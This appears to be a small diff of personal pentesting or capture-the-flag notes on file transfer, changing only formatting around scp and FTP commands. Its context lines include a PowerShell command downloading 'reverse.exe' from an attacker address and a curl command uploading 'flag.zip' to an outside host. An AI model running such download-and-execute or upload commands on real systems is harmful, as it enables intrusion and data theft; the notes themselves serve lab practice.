@@ -118,7 +118,7 @@ powershell Invoke-WebRequest -Uri http://10.10.16.4/reverse.exe -OutFile ke.exe
 
 ```
 
-# scp 
+	# scp 
 scp [OPTION] [user@]SRC_HOST:]file1 user@target:/tmp/FILE:
 SCP -i KEY FILE user@target:/tmp/FILE:
 -i for ssh key
@@ -144,9 +144,10 @@ curl 192.77.184.2 --upload-file flag.zip
 
 
 # FTP
+```
 python -m pyftpdlib 21
 ftp 10.10.10.10
-
+```
 
 
 
